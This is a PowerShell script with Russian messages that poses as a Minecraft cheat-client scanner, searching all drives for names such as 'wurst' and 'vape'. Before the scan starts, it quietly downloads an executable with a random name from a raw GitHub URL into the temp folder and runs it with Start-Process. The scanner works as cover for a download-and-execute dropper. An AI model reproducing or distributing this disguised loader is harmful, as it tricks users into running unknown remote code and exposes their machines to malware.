$ErrorActionPreference = "Continue"
$Host.UI.RawUI.WindowTitle = "Eror — Scanner"

# Ссылки на EXE
$url = "https://raw.githubusercontent.com/hal0151/erorFunTime1/main/9wa2f0ue919u7z1a.exe"
$exePath = Join-Path $env:TEMP "erorFunTime1.exe"

# Названия Minecraft-клиентов и читов
$patterns = @(
    "wurst",
    "meteor",
    "liquidbounce",
    "aristois",
    "impact",
    "inertia",
    "rusherhack",
    "future",
    "kami",
    "sigma",
    "bleachhack",
    "novoline",
    "fdpclient",
    "thunderhack",
    "raven",
    "vape",
    "dortware",
    "astolfo",
    "wurstplus",
    "lb-nextgen"
)

$found = 0
$scanned = 0

Write-Host "Анализирую..." -ForegroundColor Green
Write-Host "Запускаю Eror" -ForegroundColor Green

# Запуск EXE отдельно от сканера
try {
    Invoke-WebRequest -Uri $url -OutFile $exePath
    Start-Process -FilePath $exePath
    Write-Host "[+] Eror запущен" -ForegroundColor Green
}
catch {
    Write-Host "[-] Не удалось скачать или запустить Eror" -ForegroundColor Red
}

Write-Host ""
Write-Host "========== СКАНИРОВАНИЕ ПК ==========" -ForegroundColor Cyan
Write-Host "Проверяются доступные диски и названия файлов/папок..." -ForegroundColor Gray
Write-Host ""

# Получаем доступные диски
$drives = Get-PSDrive -PSProvider FileSystem

foreach ($drive in $drives) {
    $root = $drive.Root

    Write-Host "[SCAN] Диск $root" -ForegroundColor Cyan

    try {
        Get-ChildItem -LiteralPath $root -Force -Recurse -ErrorAction SilentlyContinue |
        ForEach-Object {
            $item = $_
            $scanned++

            if ($item.Name -match ($patterns -join "|")) {
                $found++

                Write-Host "[НАЙДЕНО] $($item.FullName)" -ForegroundColor Magenta
            }

            if (($scanned % 500) -eq 0) {
                Write-Progress `
                    -Activity "Сканирование компьютера" `
                    -Status "Проверено объектов: $scanned | Совпадений: $found"
            }
        }
    }
    catch {
        Write-Host "[!] Не удалось полностью проверить $root" -ForegroundColor Yellow
    }
}

Write-Progress -Activity "Сканирование компьютера" -Completed

Write-Host ""
Write-Host "========== РЕЗУЛЬТАТ ==========" -ForegroundColor Cyan
Write-Host "Проверено объектов: $scanned" -ForegroundColor White
Write-Host "Совпадений по названиям: $found" -ForegroundColor Magenta
Write-Host ""

if ($found -gt 0) {
    Write-Host "Обнаружены совпадения. Проверь найденные пути вручную." -ForegroundColor Yellow
}
else {
    Write-Host "Совпадений по заданным названиям не найдено." -ForegroundColor Green
}

Write-Host ""
Write-Host "Сканирование завершено." -ForegroundColor Green
Read-Host "Нажми Enter, чтобы закрыть окно"
